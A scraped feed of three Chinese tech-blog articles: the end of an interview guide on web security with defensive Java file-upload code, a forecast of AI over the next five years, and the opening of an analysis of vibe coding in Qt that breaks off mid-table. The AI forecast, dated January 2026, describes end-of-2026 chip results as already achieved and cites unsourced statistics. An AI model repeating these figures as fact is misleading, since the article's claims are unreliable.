<span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadAvatar</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam("file")</span> MultipartFile file)</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 1. 检查文件大小（限制1MB）</span>
        <span class="hljs-keyword">if</span> (file.getSize() &gt; <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"文件不能超过1MB"</span>;
        }
        
        <span class="hljs-comment">// 2. 检查文件类型（只允许图片）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">originalName</span> <span class="hljs-operator">=</span> file.getOriginalFilename();
        <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> originalName.substring(originalName.lastIndexOf(<span class="hljs-string">"."</span>) + <span class="hljs-number">1</span>).toLowerCase();
        
        <span class="hljs-keyword">if</span> (!Arrays.asList(<span class="hljs-string">"jpg"</span>, <span class="hljs-string">"jpeg"</span>, <span class="hljs-string">"png"</span>, <span class="hljs-string">"gif"</span>).contains(extension)) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"只允许上传图片文件"</span>;
        }
        
        <span class="hljs-comment">// 3. 生成安全的文件名（避免特殊字符和路径问题）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">safeName</span> <span class="hljs-operator">=</span> UUID.randomUUID() + <span class="hljs-string">"."</span> + extension;
        
        <span class="hljs-comment">// 4. 保存到安全位置</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">savePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/safe/uploads/"</span> + safeName;
        file.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(savePath));
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"上传成功，访问地址：/avatars/"</span> + safeName;
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"上传失败："</span> + e.getMessage();
    }
}
</code></pre>
<p><strong>提示</strong>：上传的文件不要直接放在网站目录下，而是通过程序控制访问。这样即使有人上传了恶意文件，也无法直接执行。</p>
<h2 data-id="heading-4">面试加分项：安全思维</h2>
<p>技术很重要，同时面试官也看重你的<strong>思维方式</strong>。以下3点，说出来能加分：</p>
<h3 data-id="heading-5">1. 安全是过程，不是功能</h3>
<p>很多团队把安全当成项目结束前才考虑的事。实际上，<strong>安全应该贯穿整个开发过程</strong>：</p>
<ul>
<li>写需求时：考虑哪些数据敏感，需要保护</li>
<li>设计系统时：想想可能有哪些风险点</li>
<li>写代码时：遵循安全编码规范</li>
<li>测试时：包含安全测试</li>
<li>上线后：监控异常行为</li>
</ul>
<h3 data-id="heading-6">2. 最小权限原则</h3>
<p>简单说：<strong>只给必要的权限</strong>。</p>
<p>应用到开发中：</p>
<ul>
<li>数据库账号：不要用root账号连接数据库，创建专用账号，只给必要权限</li>
<li>后台管理：普通编辑不能删除用户，管理员才能</li>
<li>API权限：用户只能看到自己的数据，看不到别人的</li>
</ul>
<h3 data-id="heading-7">3. 多层防御</h3>
<p>不要只靠一种防护，就像家里既有门锁，也有防盗窗。安全也一样：</p>
<ul>
<li>网络层：防火墙挡住可疑访问</li>
<li>应用层：输入验证、权限控制</li>
<li>数据层：敏感数据加密</li>
<li>业务层：异常操作监控</li>
</ul>
<h2 data-id="heading-8">面试怎么回答？模板来了</h2>
<p>当面试官问"网络安全了解多少"，你可以这样说：</p>
<blockquote>
<p>"我认为安全不是某个部门的事，而是每个开发者的责任。在我的开发经验中，我主要关注几个常见风险：</p>
</blockquote>
<blockquote>
<p>第一，防范XSS攻击。我会对用户输入进行验证，对输出内容做编码处理，确保用户输入的内容不会被当作代码执行。</p>
</blockquote>
<blockquote>
<p>第二，防范CSRF攻击。我会在表单中使用CSRF令牌，重要操作要求二次验证，确保请求是用户真实意愿。</p>
</blockquote>
<blockquote>
<p>第三，安全存储密码。我使用BCrypt算法加密存储密码，而不是明文或简单MD5，重要操作增加额外验证。</p>
</blockquote>
<blockquote>
<p>第四，安全处理文件上传。我会限制文件类型、大小，生成安全文件名，将上传的文件放在非Web访问目录。</p>
</blockquote>
<blockquote>
<p>本文首发于公众号：程序员大华，专注分享前后端开发的实战笔记。关注我，少走弯路，一起进步！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[未来五年，AI将如何重塑我们的世界？]]></title>    <link>https://juejin.cn/post/7597250364125085759</link>    <guid>https://juejin.cn/post/7597250364125085759</guid>    <pubDate>2026-01-20T11:23:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597250364125085759" data-draft-id="7597276695403020329" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="未来五年，AI将如何重塑我们的世界？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-20T11:23:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            未来五年，AI将如何重塑我们的世界？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T11:23:21.000Z" title="Tue Jan 20 2026 11:23:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>算力基础设施正成为新的“国家电网”，全球年度投资逼近万亿美元。</p>
</blockquote>
<p>“李总，我们的城市大脑刚刚完成了一次自主决策。”
在上海张江的指挥中心里，工程师小陈指着大屏幕上的动态数据流，向参观者解释。屏幕上，交通、能源、安防等系统正由一群<strong>AI智能体协同管理</strong>，它们不像传统程序那样被动响应，而是像团队一样<strong>主动规划、协商并执行任务</strong>。</p>
<p>这是2026年初的一个普通场景，却预示着未来五年AI发展的核心转向——从“能说会道”的聊天工具，<strong>演变为能在真实世界中自主行动的“智能员工”</strong>。</p>
<hr/>
<h2 data-id="heading-0">01 从单一模型到多智能体生态</h2>
<p>过去几年，全球科技界都痴迷于把模型做得更大、更聪明。但2025年后，<strong>风向变了</strong>。业界开始意识到，真正的挑战不是让单个AI更聪明，而是让多个AI像人类团队一样有效协作。</p>
<p>“单个专家再厉害，也比不上一支配合默契的团队。”北京智源人工智能研究院的研究员张明这样解释。他的团队正在开发一套<strong>多智能体协作系统</strong>，其中的AI各有所长——有的擅长分析数据，有的精于制定策略，有的则专注于执行细节。</p>
<p>这种协作不仅仅是简单分工。这些智能体会<strong>互相监督、纠错、甚至辩论</strong>，最终达成共识。研究表明，这种多智能体系统的决策质量比单一模型高出40%，更重要的是，它们表现出更强的<strong>鲁棒性和适应性</strong>。</p>
<p>在深圳，一家物流公司已经部署了这样的系统。它们的仓库里，调度、分拣、运输各个环节由不同的AI智能体管理，这些智能体实时沟通，动态调整策略。当一场突如其来的暴雨打乱配送计划时，系统在5分钟内就重新规划了全市5000多辆配送车的路线。</p>
<h2 data-id="heading-1">02 算力争夺</h2>
<p>AI越聪明，需要的“食物”就越多——这里的食物指的是<strong>算力</strong>。训练最新一代大模型需要的计算资源，大约是五年前的1000倍。这引发了一场全球性的<strong>算力军备竞赛</strong>。</p>
<p>“未来的算力中心，就像今天的发电厂一样关键。”清华大学计算机系教授王海指出。他所在的团队正在设计下一代AI专用芯片，试图在性能和能耗之间找到平衡点。</p>
<p>全球科技巨头都在疯狂投资。仅2025年，全球在AI数据中心上的投入就超过了1500亿美元。这些数据中心不仅规模庞大，<strong>地理位置也经过精心选择</strong>——靠近清洁能源基地，利用凉爽气候自然降温，甚至考虑地质稳定性。</p>
<p>中国在这场竞赛中采取了两条腿走路的策略。一方面积极采购国际先进芯片，另一方面加速<strong>国产替代</strong>。到2026年底，中国自主研发的AI芯片在部分场景下的性能已经达到国际主流产品的80%，而成本只有一半。</p>
<h2 data-id="heading-2">03 AI落地千行百业</h2>
<p>当AI从实验室走向生产线，一场<strong>场景革命</strong>正在发生。未来五年，我们将在三个关键领域看到AI的深刻影响：</p>
<p><strong>工业制造</strong>正在经历智能化改造。在上海的一家汽车工厂，<strong>具身智能机器人</strong>已经能够完成90%的装配工作。这些机器人不仅按程序操作，还能通过视觉和触觉传感器感知环境，处理突发情况。当零件出现微小瑕疵时，它们可以即时调整装配方式，保证产品质量。</p>
<p><strong>医疗健康</strong>领域，AI正在从辅助诊断向<strong>全程参与</strong>转变。杭州一家医院引入了AI诊疗系统，能够根据患者的病史、检查数据和最新医学文献，提供个性化的治疗方案。更重要的是，这个系统会跟踪治疗效果，动态调整方案。</p>
<p><strong>金融服务</strong>也在被重构。传统风控模型依赖历史数据，而AI系统能分析数万维度的实时数据，<strong>预测潜在风险</strong>。一家商业银行的AI系统曾提前三个月预警了某行业的系统性风险，使银行避免了数亿元损失。</p>
<h2 data-id="heading-3">04 AI+引爆创新奇点</h2>
<p>单独发展的AI技术已足够惊人，但当AI与其它前沿技术结合时，将产生<strong>指数级效应</strong>。</p>
<p>AI与生物技术的融合正在改写生命科学的研究范式。传统新药研发平均需要10年时间和10亿美元投入，而<strong>AI制药</strong>平台能将这一过程缩短至2-3年，成本降低70%。2025年，全球首个完全由AI设计并验证的抗生素进入临床试验，标志着这一领域的成熟。</p>
<p>在材料科学领域，AI同样大放异彩。南京理工大学的研究团队使用AI平台，在六个月内发现了三种<strong>新型超导材料</strong>，而传统方法可能需要数十年。AI通过模拟原子级相互作用，预测材料性能，大幅加速了研发进程。</p>
<p><strong>能源领域</strong>的融合同样值得关注。国家电网正在建设基于AI的智慧能源系统，它能预测不同地区的用电需求，动态调整发电和配送策略。初步运行数据显示，这套系统能将电网整体效率提升15%，相当于每年节省数千万吨标准煤。</p>
<h2 data-id="heading-4">05 治理挑战</h2>
<p>随着AI能力增强，<strong>安全和治理</strong>问题日益凸显。未来五年，如何引导AI向善，将成为与技术创新同等重要的议题。</p>
<p>2026年，欧盟的《人工智能法案》将正式生效，这是全球首个全面规制AI的法律框架。法案根据风险等级将AI应用分为四类，对高风险应用实施严格监管。“这只是一个开始。”法案主要起草者之一表示，“未来几年，各国都会跟进类似的立法。”</p>
<p>在中国，AI治理强调<strong>发展与安全并重</strong>。2025年发布的《人工智能伦理准则》提出了“可控可靠、公平公正、透明可释、保护隐私”四大原则。企业开发AI产品时，必须进行伦理影响评估。</p>
<p>技术层面，<strong>可解释AI</strong>成为研究热点。科学家们试图打开AI的“黑箱”，理解决策过程。这不仅是为了满足监管要求，更是为了建立用户信任。当AI参与医疗、金融等关键决策时，人们有权知道它为何给出特定建议。</p>
<p>企业也在主动采取措施。阿里巴巴推出了“AI透明中心”，用户可以查看AI系统的决策逻辑和数据来源。百度则开发了“AI监督员”系统，实时监测AI行为，发现异常立即干预。</p>
<hr/>
<p>在深圳的AI创新峰会上，一位行业领袖这样总结：“未来五年，<strong>AI将从‘玩具’变成‘工具’，最终成为‘伙伴’</strong>。”</p>
<p>这一转变不会一帆风顺。技术瓶颈、伦理困境、社会接受度……挑战无处不在。但可以肯定的是，AI已经不再是科幻小说的主题，而是<strong>塑造我们工作、生活和思维方式的核心力量</strong>。</p>
<p>当2030年到来时，回望这五年，我们或许会发现：最大的变化不是AI变得多强大，而是<strong>我们学会了如何与AI共生</strong>——在享受技术红利的同时，守护人类的价值观和尊严。</p>
<p>这场旅程才刚刚开始，而每个人都是参与者。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vibe Coding在QT桌面开发中的可行性分析]]></title>    <link>https://juejin.cn/post/7597253913248612393</link>    <guid>https://juejin.cn/post/7597253913248612393</guid>    <pubDate>2026-01-20T11:26:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597253913248612393" data-draft-id="7597253913248596009" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vibe Coding在QT桌面开发中的可行性分析"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-20T11:26:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vibe Coding在QT桌面开发中的可行性分析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T11:26:42.000Z" title="Tue Jan 20 2026 11:26:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>资深QT开发者拉斐尔在一个小型桌面应用项目中尝试了Vibe Coding，两周内完成了原本需要两个月的开发工作，但后续维护阶段发现，修复AI生成的代码漏洞所花费的时间，几乎与重写整个项目相当。</p>
</blockquote>
<p>“看起来很简单，但实则在应用部署、跨平台兼容性和后期维护方面存在诸多挑战。”一位尝试过Vibe Coding的开发者这样描述他在传统QT开发中应用这种新范式的经历。</p>
<hr/>
<h2 data-id="heading-0">01 新范式的渗透</h2>
<p>软件开发领域正经历一场由Vibe Coding带来的变革。这一术语由前特斯拉AI负责人Andrej Karpathy提出，指的是通过自然语言与大型语言模型对话来生成代码的编程方式。</p>
<p>根据行业共识，到2026年，这一开发形态将步入成熟爆发期，预计将孕育出万亿级市场及数百万“一人公司”模式的超级个体。</p>
<p>Vibe Coding标志着编程模式的转变——从手动编写每一行代码转向意图规范。开发者只需描述想要实现的功能，而人工智能则负责具体的实现方式。</p>
<p>正如Karpathy所言，“这不完全是编码——我只是看到东西，说出东西，运行东西，然后复制粘贴东西，它基本上能用。”</p>
<p>然而，当这一新兴范式遇上成熟的QT桌面开发框架，情况变得复杂而值得深思。</p>
<h2 data-id="heading-1">02 QT开发的新老困境</h2>
<p>传统QT开发常常面临资源困境与“高端”诉求的矛盾。多数企业认为QT“轻量化”就等于“低成本”，却忽视高端应用对性能、界面、稳定性的综合要求。</p>
<p>一个典型的QT项目可能仅有3人开发团队，却要在8周内完成既要满足工程师对数据处理的高性能需求，又要具备媲美专业设计软件交互体验的应用。</p>
<p>在这种情况下，技术团队通常需要采用“资源聚焦核心体验，技术放大QT原生优势”的思路，通过<strong>需求锚定</strong>和<strong>技术选型优化</strong>来应对挑战。</p>
<p><em>表：传统QT开发中的资源分配困境</em></p>






























<table><thead><tr><th><strong>挑战类型</strong></th><th><strong>具体表现</strong></th><th><strong>传统解决方案</strong></th></tr></thead><tbody><tr><td>资源限制</td><td>开发团队小、周期短、测试环境有限</td><td>需求优先级排序，聚焦核心功能</td></tr><tr><td>性能要求</td><td>大数据量处理、实时渲染需求</td><td>利用QT原生模块优化性能</td></tr><tr><td>交互体验</td><td>专业级的用户界面和操作流畅度</td><td>采用QML等现代UI技术</td></tr><tr><td>跨平台兼容性</td><td>需要在Windows、Linux等多平台运行</td><td>充分利用QT的跨平台特性</td></tr></tbody></table>
<p>与此同时，Vibe Coding作为新兴开发范式，带来了截然不同的可能性。GitHub的2025年度开发者报告显示，约35%的开发者在特定项目中尝试过Vibe Coding，其中<strong>独立开发者和小型团队的使用比例更高</strong>。</p>
<h2 data-id="heading-2">03 Vibe Coding与QT框架的碰撞测试</h2>
<p>当开发者开始探索Vibe Coding在QT开发中的应用时，两种看似矛盾的开发哲学产生了有趣的火花。在技术集成层面，Vibe Coding与QT的结合展现出一定的潜力。</p>
<p>一位开发者尝试使用Vibe Coding来改造一个简单的QT浏览器应用，他让AI“删除URL栏”、“提供不妨碍操作的前进/后退按钮”等。</p>
<p>这些看似简单的需求在实际实施中却遇到了意料之外的问题。AI生成的代码存在多种问题，包括重定向处理不当、历史记录管理不佳，甚至有语法错误和导入不当的情况。</p>
<p>这种“看起来有效但实际脆弱”的代码在QT桌面开发中尤其危险，因为桌面应用通常需要更长的维护周期和更高的稳定性。</p>
<p>一个值得注意的现象是，QT开发中许多复杂的特性——如信号与槽机制、多线程编程（Qt Concurrent）、自定义QML组件等——对当前的大语言模型来说仍是挑战。开发者反馈，AI往往能生成“基本能用”的代码，但在处理QT特有的<strong>内存管理模型</strong>和<strong>跨线程通信</strong>时表现不佳。</p>
<h2 data-id="heading-3">04 可行性与风险评估</h2>
<p>那么，Vibe Coding在QT开发中到底有多少可行性？这一问题需要从多个维度进行考量。</p>
<p>Linus Torvalds对Vibe Coding的看法颇具代表性：他认为这种方式非常适合作为新人进入编程世界的入口工具，但<strong>不适合用于任何关键或长期维护的重要系统</strong>。</p>
<p>他指出，Vibe Coding生成的代码可读性与可维护性往往堪忧，如果把它用在生产环境中，未来的维护成本可能会非常高。</p>
<p><em>表：Vibe Coding在QT开发中的适用场景与风险</em></p>






























<table><thead><tr><th><strong>适用场景</strong></th><th><strong>潜在收益</strong></th><th><strong>主要风险</strong></th></tr></thead><tbody><tr><td>快速原型验证</td><td>加速概念验证过程，降低初始开发成本</td><td>生成的代码结构混乱，难以维护</td></tr><tr><td>样板代码生成</td><td>自动化重复性编码任务，提高效率</td><td>缺乏对特定业务逻辑的理解</td></tr><tr><td>小型工具开发</td><td>使非专业开发者也能创建实用工具</td><td>安全漏洞难以发现，尤其在复杂系统中</td></tr><tr><td>学习与探索</td><td>帮助初学者快速入门QT开发</td><td>可能导致对底层技术的理解不足</td></tr></tbody></table>
